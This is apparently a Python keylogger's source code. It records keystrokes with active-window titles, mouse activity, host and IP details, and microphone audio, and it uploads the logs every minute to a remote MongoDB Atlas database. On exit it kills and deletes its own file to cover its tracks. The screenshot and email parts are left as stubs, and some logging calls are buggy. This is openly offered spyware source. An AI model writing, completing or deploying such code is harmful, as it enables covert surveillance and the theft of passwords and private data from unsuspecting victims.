import os
import platform
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import logging
import datetime
import pygetwindow
import pymongo
from pymongo import DeleteMany
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener

SEND_REPORT_EVERY = 60  # as in seconds
LOG_FILE = 'keylogs.txt'  # File to store logs

# Connect to MongoDB
client = pymongo.MongoClient("mongodb+srv://<username>:<password>@keyspy.iarapa1.mongodb.net/") #monogDB Atlas connection link
db = client["keylogger"]
keylogs_collection = db["keylog"]

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = ""
        self.log_file = 'keylogs.txt'

        # Delete existing keylogs.txt file if present
        if os.path.exists(self.log_file):
            os.remove(self.log_file)

        logging.basicConfig(filename=self.log_file, level=logging.INFO, format="%(asctime)s> %(message)s")

    def append_log(self, log):
        with open(self.log_file, 'a') as file:  # Append mode to add new logs
            file.write(log + '\n')

    def save_log(self, log):
        with open(self.log_file, 'w') as file:  # Open file in write mode to overwrite
            file.write(log + '\n')

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.append_log(current_move)

    def on_press(self, key):
        try:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindow().title)
            logging.info(f"{current_time}> {window[0].title}> '{key.char}'")
        except AttributeError:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            logging.info(f"{current_time}> Unknown Window> {key}")

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindow().title)
            logging.info(f"{current_time}> {window[0].title}> Mouse {button} clicked at ({x}, {y})")

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.append_log(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.append_log(current_key)

    def report(self):
        global logs
        self.store_in_mongodb()  # Store logs in MongoDB
        self.save_log(self.log)  # Save log to file
        self.log = ""  # Clear current log
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def store_in_mongodb(self):
        # Read the text file
        file_path = "keylogs.txt"
        with open(file_path, "r") as file:
            lines = file.readlines()

        # Insert each line as a separate document into the collection
        for line in lines:
            # Strip any leading/trailing whitespace and skip empty lines
            line = line.strip()
            if line:
                document = {"text": line}
                keylogs_collection.insert_one(document)

        print("Text content stored in MongoDB successfully.")

        # Clear the contents of the text file
        self.save_log("")

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.append_log(hostname)
        self.append_log(ip)
        self.append_log(plat)
        self.append_log(system)
        self.append_log(machine)

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        # Send email with sound recording
        # Modify this part if you want to implement sound recording functionality

    def screenshot(self):
        img = pyscreenshot.grab()
        # Send email with screenshot
        # Modify this part if you want to implement screenshot functionality

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')

# Start keylogger
if __name__ == "__main__":
    keylogs_collection.delete_many({})
    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()
